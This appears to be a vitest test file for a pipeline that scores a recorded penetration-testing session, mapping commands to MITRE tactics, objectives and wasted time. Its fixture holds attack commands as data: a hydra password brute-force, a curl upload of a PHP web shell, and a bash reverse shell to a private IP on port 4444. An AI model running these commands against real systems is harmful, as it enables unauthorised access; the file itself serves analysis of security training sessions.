import { describe, it, expect } from "vitest";
import { runPipeline } from "./index";
import type { RawCommand } from "./types";
import type { GoldenObjective } from "../../types/report";

const base = 1_700_000_000_000;

// A compact but realistic raw session: recon → exploit → foothold → a 6-min stall → privesc.
const raw: RawCommand[] = [
  { cmd: "nmap -sV 10.10.10.5", started_at_ms: base, ended_at_ms: base + 60_000, exit_code: 0, output_line_count: 40, output_digest: "22,80 open" },
  { cmd: "gobuster dir -u http://10.10.10.5 -w common.txt", started_at_ms: base + 80_000, ended_at_ms: base + 130_000, exit_code: 0, output_line_count: 4000, output_digest: "/admin /upload", volume: 4600 },
  { cmd: "curl -s http://10.10.10.5/admin", started_at_ms: base + 145_000, ended_at_ms: base + 146_000, exit_code: 0, output_line_count: 10, output_digest: "login form" },
  { cmd: "hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form ...", started_at_ms: base + 156_000, ended_at_ms: base + 196_000, exit_code: 1, output_line_count: 50, output_digest: "0 valid - rate-limited", volume: 1_400_000 },
  { cmd: "curl -d user=admin&pass=admin http://10.10.10.5/admin", started_at_ms: base + 208_000, ended_at_ms: base + 209_000, exit_code: 0, output_line_count: 3, output_digest: "302 -> dashboard" },
  { cmd: "curl -F file=@shell.phtml http://10.10.10.5/upload", started_at_ms: base + 229_000, ended_at_ms: base + 230_000, exit_code: 0, output_line_count: 2, output_digest: "accepted /uploads/shell.phtml" },
  { cmd: 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"', started_at_ms: base + 248_000, ended_at_ms: base + 249_000, exit_code: 0, output_line_count: 1, output_digest: "www-data shell" },
  { cmd: "sudo -l", started_at_ms: base + 609_000, ended_at_ms: base + 609_500, exit_code: 0, output_line_count: 3, output_digest: "(ALL) NOPASSWD: /usr/bin/find" },
];

const golden: GoldenObjective[] = [
  { objective: "enumerate_services", tactic: "TA0007", satisfied_by: ["nmap"], depends_on: [] },
  { objective: "enumerate_web", tactic: "TA0007", satisfied_by: ["gobuster", "ffuf"], depends_on: ["enumerate_services"] },
  { objective: "achieve_code_execution", tactic: "TA0002", satisfied_by: ["bash", "nc"], depends_on: ["enumerate_web"] },
  { objective: "find_sudo_misconfig", tactic: "TA0004", satisfied_by: ["sudo -l"], depends_on: [] },
  { objective: "credential_reuse", tactic: "TA0001", satisfied_by: ["ssh"], depends_on: [] },
];

describe("runPipeline — raw telemetry to report contract (§4 end to end)", () => {
  const r = runPipeline(raw, { golden });

  it("emits a think_pause episode for the 6-minute stall", () => {
    const pauses = r.episodes.filter((e) => e.actor === "think_pause");
    expect(pauses).toHaveLength(1);
    expect(pauses[0].gap_before_ms).toBe(360_000);
    expect(r.episodes).toHaveLength(raw.length + 1);
  });

  it("aligns the four reachable objectives and skips credential reuse (80% coverage)", () => {
    expect(r.metrics.objective_coverage_pct).toBe(80);
    expect(r.golden.find((o) => o.objective === "credential_reuse")!.user_satisfied_by_seq).toBeNull();
  });

  it("flags the loud, low-yield hydra run as a detour", () => {
    const hydra = r.episodes.find((e) => e.binary === "hydra")!;
    expect(hydra.alignment).toBe("detour");
    expect(r.metrics.time_waster.detour_ms).toBe(50_000);
  });

  it("accounts the stall as stuck time above the P75 baseline", () => {
    // P75 of {15000,12000,20000,18000,360000} = 20000 → stuck = 360000 - 20000
    expect(r.metrics.time_waster.stuck_ms).toBe(340_000);
  });

  it("derives a phase map with a badly inefficient privesc phase", () => {
    const privesc = r.phases.find((p) => p.mitre_tactic === "TA0004")!;
    expect(privesc.label).toBe("Privilege Escalation");
    expect(privesc.efficiency_pct).toBeLessThan(20);
  });

  it("classifies the reverse shell as Execution despite the leading 'bash'", () => {
    const shell = r.episodes.find((e) => e.cmd.includes("/dev/tcp/"))!;
    expect(shell.tactic).toBe("TA0002");
    expect(shell.alignment).toBe("match");
  });

  it("is deterministic — identical re-run", () => {
    expect(runPipeline(raw, { golden })).toEqual(r);
  });
});
